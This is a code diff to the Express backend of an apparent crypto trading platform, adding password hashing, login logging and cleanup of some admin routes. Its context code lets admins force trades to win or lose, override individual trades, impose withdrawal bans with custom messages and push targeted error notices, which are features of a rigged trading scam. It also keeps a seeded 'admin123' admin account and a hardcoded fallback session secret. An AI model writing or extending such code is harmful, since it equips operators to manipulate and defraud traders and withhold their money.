@@ -29,16 +29,18 @@ app.use('/uploads', express.static(UPLOADS_DIR));
 
 const PORTAL_MODE = process.env.PORTAL_MODE || 'ALL';
 
+const staticOpts = { extensions: ['html'] };
+
 if (PORTAL_MODE === 'ADMIN') {
-  app.get('/', (req, res) => res.redirect('/login.html'));
-  app.use('/', express.static(ADMIN_DIR));
+  app.get('/', (req, res) => res.redirect('/login'));
+  app.use('/', express.static(ADMIN_DIR, staticOpts));
 } else if (PORTAL_MODE === 'TRADER') {
   app.use('/admin', (req, res) => res.status(404).send('Not Found'));
-  app.use('/', express.static(TRADER_DIR));
+  app.use('/', express.static(TRADER_DIR, staticOpts));
 } else {
-  app.get('/admin', (req, res) => res.redirect('/admin/login.html'));
-  app.use('/admin', express.static(ADMIN_DIR));
-  app.use('/', express.static(TRADER_DIR));
+  app.get('/admin', (req, res) => res.redirect('/admin/login'));
+  app.use('/admin', express.static(ADMIN_DIR, staticOpts));
+  app.use('/', express.static(TRADER_DIR, staticOpts));
 }
 
 const storage = multer.diskStorage({
@@ -49,6 +51,25 @@ const storage = multer.diskStorage({
   }
 });
 const upload = multer({ storage });
+
+// ==========================================================================
+// PASSWORD HASHING (BACKWARD-COMPATIBLE WITH EXISTING TEST ACCOUNTS)
+// ==========================================================================
+function hashPassword(plain) {
+  const salt = crypto.randomBytes(16).toString('hex');
+  const derived = crypto.scryptSync(String(plain), salt, 64).toString('hex');
+  return `scrypt:${salt}:${derived}`;
+}
+
+function verifyPassword(plain, stored) {
+  if (!stored) return false;
+  if (stored.startsWith('scrypt:')) {
+    const [, salt, hash] = stored.split(':');
+    const derived = crypto.scryptSync(String(plain), salt, 64).toString('hex');
+    return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(derived, 'hex'));
+  }
+  return String(plain) === String(stored);
+}
 
 // ==========================================================================
 // REAL-TIME SSE BROADCASTER
@@ -286,10 +307,17 @@ function ensureDbInitialized() {
         target TEXT NOT NULL,
         details TEXT NOT NULL,
         timestamp TEXT NOT NULL
+      )`,
+      `CREATE TABLE IF NOT EXISTS login_logs (
+        id TEXT PRIMARY KEY,
+        userId TEXT NOT NULL,
+        username TEXT NOT NULL,
+        ip TEXT NOT NULL,
+        userAgent TEXT NOT NULL,
+        timestamp TEXT NOT NULL
       )`
     ], 'write');
 
-    // Safe column migrations for existing databases
     const safeAlter = [
       "ALTER TABLE users ADD COLUMN tradeOutcome TEXT DEFAULT 'WIN_DEFAULT'",
       "ALTER TABLE users ADD COLUMN address TEXT DEFAULT ''",
@@ -320,11 +348,10 @@ function ensureDbInitialized() {
       await dbRun(
         `INSERT INTO users (id, username, email, password, role, firstName, lastName, status, canApproveWithdrawals, createdAt)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-        ['admin-1', 'mainadmin', 'admin@daraztrade.online', 'admin123', 'MAIN_ADMIN', 'Main', 'Admin', 'ACTIVE', 1, new Date().toISOString()]
+        ['admin-1', 'mainadmin', 'admin@daraztrade.online', hashPassword('admin123'), 'MAIN_ADMIN', 'Main', 'Admin', 'ACTIVE', 1, new Date().toISOString()]
       );
     }
 
-    // Seed hardcoded dummy test users (only once)
     const dummySeeded = await dbGet("SELECT value FROM settings WHERE key = 'dummyUsersSeeded'");
     if (!dummySeeded) {
       const dummyTraders = [
@@ -361,8 +388,8 @@ function ensureDbInitialized() {
           const ts = new Date(Date.now() - (i + 1) * 3600 * 1000 * 3).toISOString();
           await dbRun(
             `INSERT INTO users (id, username, email, password, role, firstName, lastName, country, mobile, currency, profileCompleted, status, balance, totalWithdrawn, creditScore, tradeOutcome, address, city, state, createdAt)
-             VALUES (?, ?, ?, '123456', 'TRADER', ?, ?, ?, ?, 'BTC', 1, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-            [d.id, d.username, d.email, d.firstName, d.lastName, d.country, d.mobile, d.status, d.balance, d.totalWithdrawn, d.creditScore, d.tradeOutcome, d.address, d.city, d.state, ts]
+             VALUES (?, ?, ?, ?, 'TRADER', ?, ?, ?, ?, 'BTC', 1, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+            [d.id, d.username, d.email, hashPassword('123456'), d.firstName, d.lastName, d.country, d.mobile, d.status, d.balance, d.totalWithdrawn, d.creditScore, d.tradeOutcome, d.address, d.city, d.state, ts]
           );
           await dbRun(
             `INSERT OR IGNORE INTO transactions (trx, userId, username, type, amount, postBalance, note, timestamp)
@@ -418,8 +445,10 @@ function generateTrx() {
 
 function formatUserRow(row) {
   if (!row) return null;
+  const safe = { ...row };
+  delete safe.password;
   return {
-    ...row,
+    ...safe,
     balance: Number(row.balance || 0),
     inOrderBalance: Number(row.inOrderBalance || 0),
     totalWithdrawn: Number(row.totalWithdrawn || 0),
@@ -477,7 +506,6 @@ async function settleExpiredTrades() {
     if (!user) continue;
 
     let exitPrice = marketPrices[trade.pair];
-    // Priority: 1) Single-trade override -> 2) Per-user tradeOutcome -> 3) Global tradeOutcomeMode (WIN_DEFAULT)
     let mode = settings.tradeOutcomeMode || 'WIN_DEFAULT';
     if (user.tradeOutcome === 'FORCE_WIN' || user.tradeOutcome === 'FORCE_LOSS') {
       mode = user.tradeOutcome === 'FORCE_WIN' ? 'WIN_DEFAULT' : 'LOSS_DEFAULT';
@@ -551,7 +579,7 @@ async function settleExpiredTrades() {
 // ==========================================================================
 // AUTH MIDDLEWARE & SIGNED TOKENS
 // ==========================================================================
-const SESSION_SECRET = process.env.SESSION_SECRET || 'daraz-trade-hmac-secret-2026';
+const SESSION_SECRET = process.env.SESSION_SECRET || crypto.createHash('sha256').update(process.env.TURSO_AUTH_TOKEN || 'daraz-trade-hmac-secret-2026').digest('hex');
 
 function signSession(user) {
   const payload = Buffer.from(JSON.stringify({
@@ -593,6 +621,7 @@ function requireAuth(roles = []) {
       if (!row) return res.status(401).json({ error: 'Unauthorized. Please log in.' });
 
       const user = formatUserRow(row);
+      user._rawPassword = row.password;
       if (user.status === 'BANNED' || user.status === 'FROZEN') {
         return res.status(403).json({ error: `Account is ${user.status}. Contact Help Center.` });
       }
@@ -653,7 +682,7 @@ app.post('/api/auth/register', async (req, res) => {
   await dbRun(
     `INSERT INTO users (id, username, email, password, role, country, mobile, currency, invitationCode, createdAt)
      VALUES (?, ?, ?, ?, 'TRADER', ?, ?, ?, ?, ?)`,
-    [id, username, email, password, country || 'Pakistan', mobile || '', currency || 'BTC', invitationCode || '', new Date().toISOString()]
+    [id, username, email, hashPassword(password), country || 'Pakistan', mobile || '', currency || 'BTC', invitationCode || '', new Date().toISOString()]
   );
 
   const user = formatUserRow(await dbGet('SELECT * FROM users WHERE id = ?', [id]));
@@ -669,45 +698,33 @@ app.post('/api/auth/complete-profile', requireAuth(['TRADER']), async (req, res)
 });
 
 app.post('/api/auth/login', async (req, res) => {
-  const { login, password, portal, savedProfile } = req.body;
-  let row = await dbGet('SELECT * FROM users WHERE (username = ? OR email = ?) AND password = ?', [login, login, password]);
-
-  if (!row && savedProfile && (savedProfile.username === login || savedProfile.email === login) && savedProfile.password === password) {
-    await dbRun(
-      `INSERT OR IGNORE INTO users (id, username, email, password, role, firstName, lastName, country, mobile, currency, status, balance, creditScore, createdAt)
-       VALUES (?, ?, ?, ?, 'TRADER', ?, ?, ?, ?, ?, 'ACTIVE', ?, ?, ?)`,
-      [
-        savedProfile.id || ('usr-' + Date.now()),
-        savedProfile.username,
-        savedProfile.email,
-        savedProfile.password,
-        savedProfile.firstName || '',
-        savedProfile.lastName || '',
-        savedProfile.country || 'Pakistan',
-        savedProfile.mobile || '',
-        savedProfile.currency || 'BTC',
-        savedProfile.balance ?? 0,
-        savedProfile.creditScore ?? 100,
-        savedProfile.createdAt || new Date().toISOString()
-      ]
-    );
-    row = await dbGet('SELECT * FROM users WHERE username = ?', [savedProfile.username]);
+  const { login, password, portal } = req.body;
+  const row = await dbGet('SELECT * FROM users WHERE username = ? OR email = ?', [login, login]);
+  if (!row || !verifyPassword(password, row.password)) {
+    return res.status(401).json({ error: 'Invalid credentials.' });
   }
-
-  if (!row) return res.status(401).json({ error: 'Invalid credentials.' });
 
   const user = formatUserRow(row);
   if (user.status !== 'ACTIVE') return res.status(403).json({ error: `Account is ${user.status}.` });
   if (portal === 'ADMIN' && user.role === 'TRADER') return res.status(403).json({ error: 'Traders cannot access the Admin Portal.' });
   if (portal === 'TRADER' && user.role !== 'TRADER') return res.status(403).json({ error: 'Staff must log in via the Admin Portal.' });
 
+  const ip = (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Unknown').toString().split(',')[0].trim();
+  const ua = (req.headers['user-agent'] || 'Unknown Browser').slice(0, 120);
+  await dbRun(
+    `INSERT INTO login_logs (id, userId, username, ip, userAgent, timestamp) VALUES (?, ?, ?, ?, ?, ?)`,
+    [generateTrx(), user.id, user.username, ip, ua, new Date().toISOString()]
+  ).catch(() => {});
+
   res.json({ user, token: signSession(user) });
 });
 
 app.post('/api/auth/change-password', requireAuth(['TRADER', 'SUB_ADMIN', 'MAIN_ADMIN']), async (req, res) => {
   const { oldPassword, newPassword } = req.body;
-  if (req.user.password !== oldPassword) return res.status(400).json({ error: 'Current password is incorrect.' });
-  await dbRun('UPDATE users SET password = ? WHERE id = ?', [newPassword, req.user.id]);
+  if (!verifyPassword(oldPassword, req.user._rawPassword)) {
+    return res.status(400).json({ error: 'Current password is incorrect.' });
+  }
+  await dbRun('UPDATE users SET password = ? WHERE id = ?', [hashPassword(newPassword), req.user.id]);
   res.json({ message: 'Password updated successfully.' });
 });
 
@@ -798,12 +815,6 @@ app.post('/api/wallet/withdraw', requireAuth(['TRADER']), async (req, res) => {
   if (settings.globalWithdrawBan?.enabled) return res.status(403).json({ error: settings.globalWithdrawBan.message });
   if (req.user.withdrawBan?.enabled) return res.status(403).json({ error: req.user.withdrawBan.message });
 
-  if (req.user.creditScore < settings.minCreditScoreForWithdraw) {
-    return res.status(403).json({
-      error: `Credit score too low (${req.user.creditScore}/${settings.minCreditScoreForWithdraw}). Win more trades to unlock withdrawals.`
-    });
-  }
-
   const { amount, method, accountDetails } = req.body;
   const numAmount = Number(amount);
   if (isNaN(numAmount) || numAmount <= 0 || numAmount > req.user.balance) {
@@ -821,7 +832,7 @@ app.post('/api/wallet/withdraw', requireAuth(['TRADER']), async (req, res) => {
     {
       sql: `INSERT INTO withdrawals (id, userId, username, amount, method, accountDetails, status, createdAt)
             VALUES (?, ?, ?, ?, ?, ?, 'PENDING', ?)`,
-      args: [id, req.user.id, req.user.username, numAmount, method || 'USDT (TRC20)', accountDetails || '', new Date().toISOString()]
+      args: [id, req.user.id, req.user.username, numAmount, method || 'Direct Transfer', accountDetails || '', new Date().toISOString()]
     }
   ], 'write');
 
@@ -892,8 +903,10 @@ app.get('/api/admin/users/:id/detail', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']),
   const deposits = await dbAll('SELECT * FROM deposits WHERE userId = ? ORDER BY createdAt DESC LIMIT 50', [user.id]);
   const withdrawals = await dbAll('SELECT * FROM withdrawals WHERE userId = ? ORDER BY createdAt DESC LIMIT 50', [user.id]);
   const transactions = await dbAll('SELECT * FROM transactions WHERE userId = ? ORDER BY timestamp DESC LIMIT 50', [user.id]);
+  const logins = await dbAll('SELECT * FROM login_logs WHERE userId = ? ORDER BY timestamp DESC LIMIT 25', [user.id]);
+  const notifications = await dbAll("SELECT * FROM custom_errors WHERE targetUserId = ? OR targetUserId = 'ALL' ORDER BY createdAt DESC LIMIT 25", [user.id]);
 
-  res.json({ user, trades, deposits, withdrawals, transactions });
+  res.json({ user, trades, deposits, withdrawals, transactions, logins, notifications });
 });
 
 app.post('/api/admin/users/:id/profile', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
@@ -945,7 +958,7 @@ app.post('/api/admin/users/:id/profile', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']
 });
 
 app.post('/api/admin/trades/:id/outcome', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
-  const { outcome } = req.body; // 'WIN' | 'LOSS' | ''
+  const { outcome } = req.body;
   const trade = await dbGet('SELECT * FROM trades WHERE id = ?', [req.params.id]);
   if (!trade || trade.status !== 'RUNNING') return res.status(400).json({ error: 'Trade not running.' });
 
@@ -979,17 +992,6 @@ app.post('/api/admin/deposits/:id/review', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN
   res.json({ message: `Deposit ${status}.` });
 });
 
-app.post('/api/admin/withdrawals/:id/edit-account', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
-  const { accountDetails } = req.body;
-  const withdrawal = await dbGet('SELECT * FROM withdrawals WHERE id = ?', [req.params.id]);
-  if (!withdrawal) return res.status(404).json({ error: 'Withdrawal not found.' });
-
-  await dbRun('UPDATE withdrawals SET accountDetails = ? WHERE id = ?', [accountDetails, withdrawal.id]);
-  await logAudit(req.user, 'EDIT_WITHDRAW_ACCOUNT', withdrawal.username, `Updated ${withdrawal.id} to ${accountDetails}`);
-  broadcastEvent('WITHDRAWAL_UPDATED');
-  res.json({ message: 'Withdrawal account updated.' });
-});
-
 app.post('/api/admin/withdrawals/:id/review', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
   if (req.user.role === 'SUB_ADMIN' && !req.user.permissions?.canApproveWithdrawals) {
     return res.status(403).json({ error: 'Sub-Admin lacks withdrawal approval permission.' });
@@ -1019,24 +1021,6 @@ app.post('/api/admin/withdrawals/:id/review', requireAuth(['MAIN_ADMIN', 'SUB_AD
   await logAudit(req.user, `WITHDRAWAL_${status}`, withdrawal.username, withdrawal.id);
   broadcastEvent('WITHDRAWAL_UPDATED');
   res.json({ message: `Withdrawal ${status}.` });
-});
-
-app.post('/api/admin/users/:id/guard', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
-  const { status, tradeBan, withdrawBan } = req.body;
-  const trader = await dbGet("SELECT * FROM users WHERE id = ? AND role = 'TRADER'", [req.params.id]);
-  if (!trader) return res.status(404).json({ error: 'Trader not found.' });
-
-  if (status) await dbRun('UPDATE users SET status = ? WHERE id = ?', [status, trader.id]);
-  if (tradeBan) {
-    await dbRun('UPDATE users SET tradeBanEnabled = ?, tradeBanMessage = ? WHERE id = ?', [tradeBan.enabled ? 1 : 0, tradeBan.message || '', trader.id]);
-  }
-  if (withdrawBan) {
-    await dbRun('UPDATE users SET withdrawBanEnabled = ?, withdrawBanMessage = ? WHERE id = ?', [withdrawBan.enabled ? 1 : 0, withdrawBan.message || '', trader.id]);
-  }
-
-  await logAudit(req.user, 'GUARD_UPDATE_USER', trader.username, 'Updated restrictions');
-  broadcastEvent('USER_UPDATED');
-  res.json({ message: 'Trader updated.' });
 });
 
 app.post('/api/admin/trades/:id/void', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
@@ -1093,7 +1077,7 @@ app.post('/api/admin/users/:id/reset-password', requireAuth(['MAIN_ADMIN']), asy
   const trader = await dbGet('SELECT * FROM users WHERE id = ?', [req.params.id]);
   if (!trader || !newPassword) return res.status(400).json({ error: 'Valid user and password required.' });
 
-  await dbRun('UPDATE users SET password = ? WHERE id = ?', [newPassword, trader.id]);
+  await dbRun('UPDATE users SET password = ? WHERE id = ?', [hashPassword(newPassword), trader.id]);
   await logAudit(req.user, 'RESET_PASSWORD', trader.username, 'Password changed by Main Admin');
   res.json({ message: `Password updated for ${trader.username}.` });
 });
@@ -1120,22 +1104,6 @@ app.post('/api/admin/users/:id/adjust', requireAuth(['MAIN_ADMIN']), async (req,
   res.json({ message: 'Trader updated.' });
 });
 
-app.post('/api/admin/subadmins', requireAuth(['MAIN_ADMIN']), async (req, res) => {
-  const { username, email, password, canApproveWithdrawals } = req.body;
-  if (!username || !password) return res.status(400).json({ error: 'Username & password required.' });
-  if (await dbGet('SELECT id FROM users WHERE username = ?', [username])) return res.status(400).json({ error: 'Username exists.' });
-
-  const id = 'sub-' + Date.now();
-  await dbRun(
-    `INSERT INTO users (id, username, email, password, role, firstName, lastName, status, canApproveWithdrawals, createdAt)
-     VALUES (?, ?, ?, ?, 'SUB_ADMIN', ?, 'Guard', 'ACTIVE', ?, ?)`,
-    [id, username, email || `${username}@daraztrade.online`, password, username, canApproveWithdrawals ? 1 : 0, new Date().toISOString()]
-  );
-
-  await logAudit(req.user, 'CREATE_SUB_ADMIN', username, `Withdrawals: ${Boolean(canApproveWithdrawals)}`);
-  res.json({ message: 'Sub-Admin Guard created.' });
-});
-
 app.post('/api/admin/settings', requireAuth(['MAIN_ADMIN']), async (req, res) => {
   await saveSettings(req.body);
   await logAudit(req.user, 'UPDATE_SETTINGS', 'SYSTEM', 'Updated platform settings');
@@ -1146,12 +1114,7 @@ app.post('/api/admin/settings', requireAuth(['MAIN_ADMIN']), async (req, res) =>
 if (require.main === module) {
   ensureDbInitialized().then(() => {
     app.listen(PORT, () => {
-      console.log(`\n==================================================`);
-      console.log(`Turso Cloud DB Connected`);
-      console.log(`Trader Portal:    http://localhost:${PORT}/`);
-      console.log(`Admin Portal:     http://localhost:${PORT}/admin/login.html`);
-      console.log(`Main Admin ->     mainadmin / admin123`);
-      console.log(`==================================================\n`);
+      console.log(`Server listening on http://localhost:${PORT}`);
     });
   });
 }
